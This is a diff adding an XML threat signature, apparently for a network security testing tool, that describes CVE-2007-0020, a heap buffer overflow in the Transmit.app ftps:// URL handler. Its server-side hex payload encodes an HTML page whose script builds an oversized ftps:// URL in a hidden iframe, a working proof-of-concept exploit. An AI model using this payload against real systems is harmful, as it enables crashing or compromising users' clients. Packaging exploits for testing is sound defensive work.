@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Transmit.app &lt;= 3.5.5 ftps:// URL Handler Heap Buffer Overflow Vulnerability"/>
+    <EngDesc display="true" value="This threat uses a malicious web server reply to leverage a flaw in  Apple's Transmit.app leading to a heap-based buffer overflow condition. Transmit.app is an ftp client application that can also retrieve data from http served URIs from port 80."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Apple"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Apple_Transmit.app"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Apple_Transmit.app_3.5.5"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/3160"/>
+    <CVEID display="true" value="CVE-2007-0020"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="e2113eab5ac9e3cdc7d5bfd0e9ea11cd"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633051338937591250"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1169760594" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="E"/>
+      <for index="D"/>
+      <for index="F"/>
+    </for>
+    <for index="G"/>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E310D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="G" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E31203230302F4F4B0D0A5365727665723A20556E61626F6D6265722F312E300D0A436F6E74656E742D747970653A20746578742F786D6C0D0A0D0A3C21444F43545950452068746D6C205055424C494320222D2F2F5733432F2F445444205848544D4C20312E312F2F454E220D0A0922687474703A2F2F7777772E77332E6F72672F54522F7868746D6C31312F4454442F7868746D6C31312E647464223E0D0A3C68746D6C3E0D0A093C686561643E0D0A09093C7469746C653E4D4F41422D31392D30312D323030373C2F7469746C653E0D0A09093C7363726970743E0D0A09090966756E6374696F6E20626F6F6D2829207B0D0A0909092020202076617220726563697069656E74203D20646F63756D656E742E676574456C656D656E7442794964282774657374626F7827293B0D0A0909090976617220737472203D2027273B0D0A09090909666F7220287661722069203D20303B2069203C203430383B20692B2B29207B0D0A0909090920202020737472203D20737472202B202741270D0A090909097D0D0A09090909737472203D20737472202B202741424344273B0D0A090909090D0A09090909616C65727428275061796C6F61642073697A653A2027202B207374722E6C656E677468293B0D0A090909090D0A09090909737472203D2022667470733A2F2F22202B207374723B0D0A0909090966746172676574203D20646F63756D656E742E637265617465456C656D656E742827696672616D6527293B0D0A09090909667461726765742E737263203D207374723B0D0A09090909667461726765742E7769647468203D20313B0D0A09090909667461726765742E686569676874203D20313B0D0A09090909726563697069656E742E617070656E644368696C642866746172676574293B0D0A0909097D0D0A09093C2F7363726970743E0D0A093C2F686561643E0D0A093C626F64793E0D0A09202020203C6469762069643D2274657374626F7822207374796C653D22646973706C61793A206E6F6E653B223E3C2F6469763E0D0A09093C696E70757420747970653D22627574746F6E22206F6E636C69636B3D22626F6F6D28293B222076616C75653D2254657374204D4F41422D31392D30312D3230303722202F3E0D0A0D0A093C2F626F64793E0D0A3C2F68746D6C3E0D0A0D0A23206D696C7730726D2E636F6D205B323030372D30312D32305D" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
